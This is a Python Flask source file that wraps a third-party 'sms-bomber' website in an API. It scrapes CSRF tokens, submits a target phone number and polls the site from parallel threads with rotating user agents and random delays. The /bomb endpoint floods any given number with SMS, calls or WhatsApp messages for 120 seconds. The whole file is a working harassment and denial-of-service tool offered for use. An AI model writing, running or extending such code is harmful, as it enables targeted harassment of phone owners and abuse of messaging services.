from flask import Flask, request, jsonify
import threading
import time
import random
import re
import json
import base64
import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

BASE_URL = "https://toolground.in"
BOMBER_PAGE = f"{BASE_URL}/sms-bomber.php"
API_BASE = f"{BASE_URL}/api"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
]

class BomberSession:
    def __init__(self):
        self.session = requests.Session()
        self._set_headers()

    def _set_headers(self):
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": BASE_URL,
            "Referer": BOMBER_PAGE,
            "X-Requested-With": "XMLHttpRequest",
        })

    def get_csrf(self):
        self._set_headers()
        try:
            r = self.session.get(BOMBER_PAGE, timeout=12)
            match = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
            return match.group(1) if match else None
        except:
            return None

    def start_bomb(self, phone: str, country: str, bomb_type: str, csrf: str):
        data = {
            "_token": csrf,
            "country": country,
            "number": phone,
            "terms": "on",
            "submit": bomb_type.upper(),
        }
        try:
            r = self.session.post(BOMBER_PAGE, data=data, timeout=12, allow_redirects=False)
            match = re.search(r'bombing\.php\?data=([A-Za-z0-9+/=]+)', r.text)
            if match:
                b64 = match.group(1) + "==" * (4 - len(match.group(1)) % 4)
                payload = json.loads(base64.b64decode(b64))
                return payload.get("token")
        except:
            pass
        return None

    def poll(self, token: str, country: str, bomb_type: str):
        url = f"{API_BASE}/{bomb_type}.php?token={token}&code={country}"
        try:
            r = self.session.get(url, timeout=8)
            if r.status_code == 200:
                return r.json()
        except:
            pass
        return {}

def run_bomb_for_duration(phone: str, country: str = "91", bomb_type: str = "sms", duration_sec: int = 120):
    start_time = time.time()
    total_msgs = 0
    last_count = 0
    bomber = BomberSession()

    def refresh_and_poll():
        nonlocal total_msgs, last_count
        csrf = bomber.get_csrf()
        if not csrf:
            return 0
        token = bomber.start_bomb(phone, country, bomb_type, csrf)
        if not token:
            return 0

        for _ in range(6):  # ~20-30s per token life
            if time.time() - start_time > duration_sec:
                return total_msgs
            time.sleep(random.uniform(2.5, 4.8))
            result = bomber.poll(token, country, bomb_type)
            current = result.get("count", result.get("smsCount", 0))
            if current > last_count:
                delta = current - last_count
                total_msgs += delta
                last_count = current
            if time.time() - start_time > duration_sec:
                break
        return total_msgs

    with ThreadPoolExecutor(max_workers=3) as executor:  # parallel token lifecycles
        futures = []
        while time.time() - start_time < duration_sec:
            futures.append(executor.submit(refresh_and_poll))
            time.sleep(random.uniform(1.2, 3.0))  # stagger starts

        for future in as_completed(futures):
            total_msgs = max(total_msgs, future.result())

    log.info(f"Bomb finished → +{country}{phone} | ~{total_msgs} msgs | {duration_sec}s")
    return total_msgs

@app.route("/bomb", methods=["POST"])
def api_bomb():
    data = request.get_json(silent=True) or {}
    phone = data.get("number", "").strip()
    country = data.get("country", "91").strip()
    btype = data.get("type", "sms").lower().strip()

    if not phone or not phone.isdigit() or len(phone) < 8:
        return jsonify({"error": "invalid_number"}), 400

    if btype not in ("sms", "call", "whatsapp", "mix"):
        btype = "sms"

    # Start bombing in background thread (non-blocking response)
    def background_bomb():
        run_bomb_for_duration(phone, country, btype, duration_sec=120)

    threading.Thread(target=background_bomb, daemon=True).start()

    return jsonify({
        "status": "started",
        "target": f"+{country}{phone}",
        "type": btype,
        "duration": "120 seconds",
        "message": "Bombing initiated - no count exposed"
    }), 202

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.utcnow().isoformat()})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
